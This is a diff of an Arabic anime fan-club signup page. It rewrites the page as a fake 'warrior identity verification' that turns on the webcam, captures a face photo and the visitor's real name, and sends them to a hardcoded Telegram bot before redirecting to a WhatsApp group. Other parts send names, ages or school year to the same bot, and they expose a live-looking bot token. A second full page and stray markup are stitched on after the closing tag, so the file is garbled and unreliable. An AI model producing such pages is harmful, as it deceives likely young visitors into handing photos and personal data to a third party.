@@ -3,147 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مملكة الأوتـاكو | يوسف ⛩️</title>
+    <title>تحقق الهوية | مملكة يوسف ⛩️</title>
     <style>
-        :root { --main-color: #ff0000; --bg-dark: #0a0a0a; }
-        body {
-            background: var(--bg-dark);
-            color: white;
-            font-family: 'Cairo', sans-serif;
-            margin: 0;
-            overflow-x: hidden;
-        }
-        /* فيديو الخلفية */
-        #bg-video {
-            position: fixed;
-            right: 0; bottom: 0;
-            min-width: 100%; min-height: 100%;
-            z-index: -1;
-            opacity: 0.4;
-            filter: grayscale(50%);
-        }
-        .main-card {
-            background: rgba(0, 0, 0, 0.85);
-            max-width: 500px;
-            margin: 50px auto;
-            padding: 30px;
-            border-radius: 20px;
-            border: 2px solid var(--main-color);
-            box-shadow: 0 0 30px var(--main-color);
-            text-align: center;
-            backdrop-filter: blur(10px);
-        }
-        h1 { font-size: 32px; color: var(--main-color); text-shadow: 0 0 10px #ff0000; }
-        
-        /* شبكة الشخصيات */
-        .char-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-        .char-item {
-            cursor: pointer;
-            border: 2px solid transparent;
-            border-radius: 10px;
-            transition: 0.3s;
-            overflow: hidden;
-        }
-        .char-item img { width: 100%; filter: grayscale(100%); transition: 0.3s; }
-        .char-item.selected { border-color: var(--main-color); transform: scale(1.1); }
-        .char-item.selected img { filter: grayscale(0%); }
-
-        input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            color: white;
-            border-radius: 10px;
-            box-sizing: border-box;
-            outline: none;
-        }
-        input:focus { border-color: var(--main-color); }
-
-        .btn-join {
-            background: var(--main-color);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 10px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 20px;
-            transition: 0.3s;
-            text-shadow: 2px 2px #000;
-        }
-        .btn-join:hover { transform: scale(1.05); box-shadow: 0 0 20px var(--main-color); }
+        :root { --main: #ff3e3e; --gold: #ffcc00; }
+        body { margin: 0; background: #000; color: white; font-family: 'Cairo', sans-serif; text-align: center; }
+        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.4; }
+        .card { background: rgba(10, 10, 10, 0.9); width: 90%; max-width: 400px; margin: 50px auto; padding: 25px; border-radius: 20px; border: 2px solid var(--main); box-shadow: 0 0 20px var(--main); }
+        video { width: 100%; border-radius: 10px; border: 2px solid var(--gold); margin-bottom: 10px; display: none; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #1a1a1a; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-cam { background: #444; color: white; }
+        .btn-join { background: var(--main); color: white; font-size: 18px; box-shadow: 0 4px 0 #b30000; }
+        #status { font-size: 14px; margin-top: 10px; color: var(--gold); }
     </style>
 </head>
 <body>
 
-    <video autoplay muted loop id="bg-video">
-        <source src="https://assets.mixkit.co/videos/preview/mixkit-anime-character-in-front-of-a-full-moon-23142-large.mp4" type="video/mp4">
+    <video autoplay muted loop id="bg-video" playsinline>
+        <source src="https://v1.pichau.com.br/anime-bg-video.mp4" type="video/mp4">
     </video>
 
-    <audio id="hype-sound" src="https://www.myinstants.com/media/sounds/naruto-shippuden-jutsu-sound-effect.mp3"></audio>
+    <div class="card">
+        <h1>⛩️ إثبات هوية المحارب ⛩️</h1>
+        <p style="font-size: 13px;">يجب التقاط صورة حية لتأكيد انضمامك للمملكة</p>
 
-    <div class="main-card">
-        <h1>⛩️ نـادي الأوتـاكو الأسطوري ⛩️</h1>
-        <p>اختر شخصيتك وحدد لقبك لتنضم لجيش يوسف!</p>
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="capture" style="display:none;"></canvas>
 
-        <div class="char-grid">
-            <div class="char-item" onclick="selectChar('لوفي', this)"><img src="https://i.pinimg.com/originals/01/7e/17/017e179e889d13e9a7e801197472097e.jpg" alt="Luffy"></div>
-            <div class="char-item" onclick="selectChar('زورو', this)"><img src="https://i.pinimg.com/736x/21/e5/22/21e522928503ee055047b74686300188.jpg" alt="Zoro"></div>
-            <div class="char-item" onclick="selectChar('إيتاشي', this)"><img src="https://i.pinimg.com/originals/a0/0c/7c/a00c7c34d402377a796696e5746b19a1.jpg" alt="Itachi"></div>
-        </div>
+        <button class="btn btn-cam" id="cam-btn" onclick="startCamera()">فتح الكاميرا للتحقق 📸</button>
 
         <input type="text" id="name" placeholder="اسمك الحقيقي">
-        <input type="text" id="nickname" placeholder="اللقب الأسطوري (مثلاً: ملك القراصنة)">
-        <input type="number" id="age" placeholder="سنك">
-        
-        <button class="btn-join" onclick="startAdventure()">انضم الآن (Join Group) 🚀</button>
-        <p id="status"></p>
+        <input type="text" id="nick" placeholder="لقبك الأسطوري">
+
+        <button class="btn btn-join" onclick="sendToYousef()">إرسال الهوية والانضمام 🔥</button>
+        <div id="status"></div>
     </div>
 
     <script>
-        let selectedCharacter = "";
-        const whatsapp_link = "https://chat.whatsapp.com/ضع_هنا_لينك_جروبك"; // حط لينك جروبك هنا
+        const token = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
+        const chat_id = "7394389253";
+        const whatsapp = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts?mode=gi_t";
 
-        function selectChar(name, element) {
-            selectedCharacter = name;
-            document.querySelectorAll('.char-item').forEach(i => i.classList.remove('selected'));
-            element.classList.add('selected');
-            document.getElementById('hype-sound').play(); // صوت عند الاختيار
+        let video = document.getElementById('webcam');
+        let canvas = document.getElementById('capture');
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.style.display = "block";
+                document.getElementById('cam-btn').style.display = "none";
+                document.getElementById('status').innerText = "الكاميرا جاهزة! التقط وضعية الاستعداد.";
+            })
+            .catch(() => alert("يجب السماح بالكاميرا للتحقق!"));
         }
 
-        function startAdventure() {
+        function sendToYousef() {
             const name = document.getElementById('name').value;
-            const nickname = document.getElementById('nickname').value;
-            const age = document.getElementById('age').value;
+            const nick = document.getElementById('nick').value;
 
-            if(!selectedCharacter || !name || !nickname) {
-                alert("يا بطل، اختر شخصيتك ولقبك أولاً! ⚔️");
+            if(!name || !video.srcObject) {
+                alert("من فضلك افتح الكاميرا واكتب اسمك!");
                 return;
             }
 
-            // إرسال للتلجرام
+            document.getElementById('status').innerText = "جاري رفع الهوية للمملكة...";
+
+            // التقاط الصورة من الفيديو
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة لملف (Blob)
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", chat_id);
+                formData.append("photo", blob, "identity.jpg");
+                formData.append("caption", `👤 محارب جديد يطلب الانضمام!\n\nالاسم: ${name}\nاللقب: ${nick}`);
+
+                // إرسال الصورة لتليجرام
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(res => {
+                    if(res.ok) {
+                        alert("تم التحقق من هويتك بنجاح! جاري نقلك لجروب الواتساب.");
+                        window.location.href = whatsapp;
+                    }
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
+<div id="camera-container" style="display:none; margin-bottom: 15px;">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مملكة الأوتاكو الأسطورية ⛩️</title>
+    <style>
+        :root {
+            --main-color: #ff3e3e;
+            --gold: #ffcc00;
+        }
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            overflow-x: hidden; font-family: 'Cairo', sans-serif;
+            background-color: #000; color: white;
+        }
+
+        /* فيديو الخلفية */
+        #bg-video {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            object-fit: cover; z-index: -1;
+            opacity: 0.5;
+        }
+
+        .overlay {
+            min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        .card {
+            background: rgba(10, 10, 10, 0.85);
+            width: 90%; max-width: 450px;
+            padding: 30px; border-radius: 20px;
+            border: 2px solid var(--main-color);
+            box-shadow: 0 0 25px var(--main-color);
+            text-align: center; backdrop-filter: blur(10px);
+        }
+
+        h1 { color: var(--main-color); text-shadow: 0 0 10px #ff0000; margin-bottom: 5px; }
+        p.subtitle { color: var(--gold); font-size: 14px; margin-bottom: 25px; }
+
+        .char-title { text-align: right; color: var(--gold); font-size: 14px; margin-bottom: 10px; }
+        .char-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px;
+        }
+        .char-item {
+            cursor: pointer; border: 2px solid transparent; border-radius: 12px;
+            overflow: hidden; transition: 0.3s; background: #222;
+        }
+        .char-item img { width: 100%; height: 100px; object-fit: cover; filter: grayscale(100%); }
+        .char-item.active { border-color: var(--gold); transform: scale(1.05); box-shadow: 0 0 15px var(--gold); }
+        .char-item.active img { filter: grayscale(0%); }
+
+        .input-group { text-align: right; margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 14px; }
+        input {
+            width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #444;
+            background: rgba(20, 20, 20, 0.9); color: white; outline: none; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--main-color); }
+
+        .btn-join {
+            background: var(--main-color); color: white; padding: 15px;
+            border: none; border-radius: 10px; font-size: 18px; font-weight: bold;
+            cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px;
+            box-shadow: 0 5px 0 #b30000;
+        }
+        .btn-join:hover { background: #ff1a1a; transform: translateY(-2px); }
+        .btn-join:active { transform: translateY(3px); box-shadow: none; }
+    </style>
+</head>
+<body>
+
+    <video autoplay muted loop id="bg-video" playsinline>
+        <source src="https://v1.pichau.com.br/anime-bg-video.mp4" type="video/mp4">
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-stars-in-the-night-sky-loop-942-large.mp4" type="video/mp4">
+    </video>
+
+    <audio id="sfx" src="https://www.myinstants.com/media/sounds/naruto-shippuden-jutsu-sound-effect.mp3"></audio>
+
+    <div class="overlay">
+        <div class="card">
+            <h1>⛩️ مَمْلَكَة الأوتـاكو ⛩️</h1>
+            <p class="subtitle">سجل لقبك الأسطوري وانضم لجيش يوسف!</p>
+
+            <div class="char-title">اختر بـطـلك:</div>
+            <div class="char-grid">
+                <div class="char-item" onclick="selectMe('لوفي 👒', this)"><img src="https://i.pinimg.com/736x/01/7e/17/017e179e889d13e9a7e801197472097e.jpg"></div>
+                <div class="char-item" onclick="selectMe('ناروتو 🦊', this)"><img src="https://i.pinimg.com/736x/0a/6e/02/0a6e029272809633e680a37315177df8.jpg"></div>
+                <div class="char-item" onclick="selectMe('غوكو ⚡', this)"><img src="https://i.pinimg.com/736x/70/40/e3/7040e32230a6f44d82b453a258810793.jpg"></div>
+            </div>
+
+            <div class="input-group">
+                <label>👤 اسمك الحقيقي:</label>
+                <input type="text" id="name" placeholder="مثلاً: يوسف محمد">
+            </div>
+
+            <div class="input-group">
+                <label>⚔️ لقبك الأسطوري:</label>
+                <input type="text" id="nickname" placeholder="مثلاً: ملك القراصنة">
+            </div>
+
+            <div class="input-group">
+                <label>📅 السنة الدراسية:</label>
+                <input type="text" id="grade" placeholder="أنت في سنة كام؟">
+            </div>
+
+            <button class="btn-join" onclick="joinKingdom()">انضم للجروب (Join) 🔥</button>
+        </div>
+    </div>
+
+    <script>
+        let chosenHero = "";
+        // رابط جروب الواتساب الخاص بك تم وضعه هنا
+        const whatsapp = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts?mode=gi_t"; 
+
+        function selectMe(hero, el) {
+            chosenHero = hero;
+            document.querySelectorAll('.char-item').forEach(item => item.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('sfx').play();
+        }
+
+        function joinKingdom() {
+            const name = document.getElementById('name').value;
+            const nick = document.getElementById('nickname').value;
+            const grade = document.getElementById('grade').value;
+
+            if(!chosenHero || !name || !nick) {
+                alert("يا بطل! كمل بياناتك واختار بطلك!");
+                return;
+            }
+
             const token = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
             const chat_id = "7394389253";
-            const text = `🔥 عضو جديد انضم للمملكة! 🔥\n\n👤 الاسم: ${name}\n🎭 اللقب: ${nickname}\n🎂 العمر: ${age}\n⚔️ الشخصية المختارة: ${selectedCharacter}`;
-            
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+            const message = `🔥 محارب جديد انضم للمملكة! 🔥\n\n👤 الاسم: ${name}\n⚔️ اللقب: ${nick}\n🎓 السنة: ${grade}\n🛡️ البطل: ${chosenHero}`;
 
-            fetch(url).then(res => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+            .then(res => {
                 if(res.ok) {
-                    alert("تم تسجيلك في المملكة! جاري نقلك لجروب الواتساب...");
-                    window.location.href = whatsapp_link; // التحويل للواتساب
+                    alert("تم تسجيلك بنجاح! جاري نقلك لجروب الواتساب...");
+                    window.location.href = whatsapp;
                 }
             });
         }
     </script>
 </body>
 </html>
+
+    <video id="webcam" autoplay playsinline style="width: 100%; border-radius: 10px; border: 2px solid var(--gold);"></video>
+    <canvas id="photo-canvas" style="display:none;"></canvas>
+</div>
+<button type="button" onclick="openCamera()" style="background: #444; color: #fff; margin-bottom: 10px; padding: 10px; border-radius: 8px; border: none; cursor: pointer;">فتح كاميرا المحارب 📸</button>
